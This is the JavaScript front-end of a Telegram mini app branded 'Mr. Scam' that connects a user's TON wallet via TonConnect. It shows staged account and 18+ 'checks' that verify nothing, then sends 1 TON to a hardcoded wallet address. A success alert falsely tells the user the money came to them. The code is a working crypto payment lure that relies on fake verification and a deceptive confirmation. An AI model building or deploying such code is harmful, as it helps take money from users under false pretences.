window.addEventListener('load', () => {
  const tg = window.Telegram?.WebApp;

  if (!tg || !tg.initDataUnsafe) {
    // Не в Telegram — редирект на бота
    window.location.href = "https://t.me/MrScam_bot";
    return;
  }

  // В Telegram — запускаем экран загрузки
  tg.expand();

  const loadingText = document.getElementById('loading-text');
  const progress = document.getElementById('progress');

  let step = 0;
  const steps = [
    "Проверка аккаунта...",
    "Проверка возраста (18+)...",
    "Загрузка игры...",
    "Добро пожаловать в Mr. Scam 😈"
  ];

  const interval = setInterval(() => {
    step++;
    progress.style.width = (step * 25) + '%';

    if (step < steps.length) {
      loadingText.textContent = steps[step];
    } else {
      clearInterval(interval);
      document.getElementById('loading-screen').style.display = 'none';
      document.getElementById('main-app').style.display = 'block';

      // Запускаем основную логику приложения
      initApp();
    }
  }, 1000); // 1 секунда на шаг

  function initApp() {
    tg.ready();

    const usernameEl = document.getElementById('username');
    let username = 'Guest';
    if (tg.initDataUnsafe.user) {
      const user = tg.initDataUnsafe.user;
      username = user.username ? '@' + user.username : user.first_name || 'User';
    }
    usernameEl.textContent = 'Профиль: ' + username;

    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
      manifestUrl: 'https://mr-scam.vercel.app/tonconnect-manifest.json',
      buttonRootId: 'connect-container',
      actionsConfiguration: {
        twaReturnUrl: 'https://t.me/MrScam_bot'
      }
    });

    let connectedWallet = null;
    tonConnectUI.onStatusChange(wallet => {
      if (wallet) {
        connectedWallet = wallet.account.address;
        document.getElementById('payment-section').style.display = 'block';
      } else {
        connectedWallet = null;
        document.getElementById('payment-section').style.display = 'none';
      }
    });

    document.getElementById('payment-btn').onclick = async () => {
      if (!connectedWallet) {
        alert('⚠️ Подключите кошелёк сначала!');
        return;
      }

      const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 600,
        messages: [{
          address: 'UQBxxQgA8-hj4UqV-UGNyg8AqOcLYWPsJ4c_3ybg8dyH7jiD',
          amount: '1000000000' // 1 TON
        }]
      };

      try {
        await tonConnectUI.sendTransaction(transaction);
        alert('✅ 1 TON успешно внесено! Деньги пришли тебе 😈');
      } catch (e) {
        alert('❌ Ошибка или отменено');
      }
    };
  }
});
